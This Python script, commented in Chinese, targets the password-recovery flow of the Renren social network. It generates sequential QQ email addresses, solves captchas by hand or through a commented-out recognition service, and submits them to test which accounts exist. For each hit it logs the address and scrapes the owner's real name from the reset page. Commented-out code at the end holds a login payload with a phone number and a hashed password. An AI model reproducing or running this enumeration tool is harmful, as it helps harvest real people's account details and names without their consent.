import requests
# from selenium import webdriver
import time
import json
from bs4 import BeautifulSoup
import re
from PIL import Image

# import pytesseract

# 请注意，遇到被封禁的账号会报错

startnum = 1570272

while startnum < 1570273:  # 1580001 1570272
    # 初始化
    s = requests.session()
    account = startnum
    captcha = 1
    # 浏览器输入chrome://version/查看用户代理
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36"}

    # 访问主页
    response1 = s.get("https://safe.renren.com/standalone/findpwd#nogo", headers=headers)
    html = response1.text
    soup1 = BeautifulSoup(html, "lxml")

    # 提取表单数据
    listofinput = soup1.find_all("input")
    for i in listofinput:
        if i["name"] == "_captcha_type":
            _captcha_type = i["value"]
        if i["name"] == "action_token":
            action_token = i["value"]

    tokengroup1 = re.search('page_token.*?(";)', html)
    tokengroup2 = re.search('".*?"', tokengroup1.group())
    token = re.sub('["]', '', tokengroup2.group())

    # 验证码保存
    capchoose = re.search('rk=800&t=safecenter_.*?(\d")', html)
    capdol = "http://icode.renren.com/getcode.do?" + capchoose.group()
    capimg = s.get(capdol)
    with open("C:/data/project/renren/tu/" + str(account) + ".jpg", "wb") as wf:
        wf.write(capimg.content)

    '''
    # 修改图片尺寸，由于训练图片与验证图片尺寸有出入
    img = Image.open("C:/data/project/renren/tu/" + str(account) + ".jpg")
    out = img.resize((100, 60), Image.ANTIALIAS)  # resize image with high-quality
    out.save("C:/data/project/renren/tu/" + str(account) + ".jpg")

    # 验证码识别
    # print(pytesseract.image_to_string(Image.open("C:/资料/project/renren/tu/" + str(account) + ".jpg")))
    url = "http://127.0.0.1:6000/b"
    files = {'image_file': (
    'C:/data/project/renren/tu/', open('C:/data/project/renren/tu/' + str(account) + '.jpg', 'rb'), 'application')}
    r = requests.post(url=url, files=files)
    res = json.loads(r.text)
    captcha = res["value"]   
    '''

    # 输入验证码
    img = Image.open("C:/data/project/renren/tu/" + str(account) + ".jpg")
    img.show()
    captcha = input()
    img.close()

    # 设置表单数据
    payload = {"action_token": action_token,
               "domain": "renren.com",
               "account": str(account) + "66@qq.com",
               "_captcha_type": _captcha_type,
               "captcha": captcha,
               "ajax-type": "json",
               "token": token,
               "_rtk": "dbdaad19"}

    # 发送表单并处理结果
    response2 = s.post("https://safe.renren.com/standalone/findpwd/inputaccount", data=payload, headers=headers)
    result = re.search('"code".*?(\d)', response2.text)
    if result.group() == '"code":0':
        with open("1.txt", "a") as rwf:
            rwf.write(str(account) + "66@qq.com\n")
        r2cont = response2.content
        nurl1 = re.search('\?.*(",)', str(r2cont))
        nurl2 = re.sub('["]', '', nurl1.group())
        nameurl = "http://safe.renren.com/standalone/findpwd/resetpwd" + nurl2
        print(nameurl)
        nre = s.get(nameurl)
        soup2 = BeautifulSoup(nre.text, "lxml")
        listofrsp = soup2.find_all("p")
        print(listofrsp)
        for i in listofrsp:
            if i["class"] == "name":
                namedl = i["title"]
        with open("name.txt", "a") as rwf:
            rwf.write(namedl+"\n")
        print("记录成功")
        with open("C:/data/project/renren/corrcap/" + captcha + "_" + str(account) + ".jpg", "wb") as wf:
            wf.write(capimg.content)
    else:
        errresult = re.search('"error_text".*?("})', response2.text)
        if errresult.group() == '"error_text":"验证码不正确"}':
            print("验证码不正确")
            startnum = startnum - 1
        else:
            print("账号不存在")
            with open("C:/data/project/renren/corrcap/" + captcha + "_" + str(account) + ".jpg", "wb") as wf:
                wf.write(capimg.content)

    startnum += 1

    # 每个循环记录进度
    with open("p.txt", "w") as rwf:
        rwf.write(str(account) + "66@qq.com")

'''payloadtest={"email":"18721347114",
             "icode":"",
             "origURL":"http://www.renren.com/home",
             "domain":"renren.com",
             "key_id":"1",
             "captcha_type":"web_login",
             "password":"3613cc0dc0b550aa0b5288a3b1eceaeb566dbd26b16681828cdd75af67928b95",
             "rkey":"c5c08b36d1daef7b10b7ae3c886850e6",
             "f":"https%3A%2F%2Fwww.baidu.com%2Flink%3Furl%3DfZc5-5pSIdUrjZfqFczgoxelCwSdEGnro908KKCCanm%26wd%3D%26eqid%3D979dfb1b00024957000000035dc131b3"}
'''

'''response=requests.post("http://www.renren.com/ajaxLogin/login?1=1&uniqueTimestamp=20191021622681",data=payloadtest)
print(response.text)'''

'''
driver = webdriver.Chrome()     # 创建Chrome对象.
# 操作这个对象.
driver.get('https://www.baidu.com')     # get方式访问百度.
time.sleep(1000)
driver.quit()   # 使用完, 记得关闭浏览器, 不然chromedriver.exe进程为一直在内存中.
'''
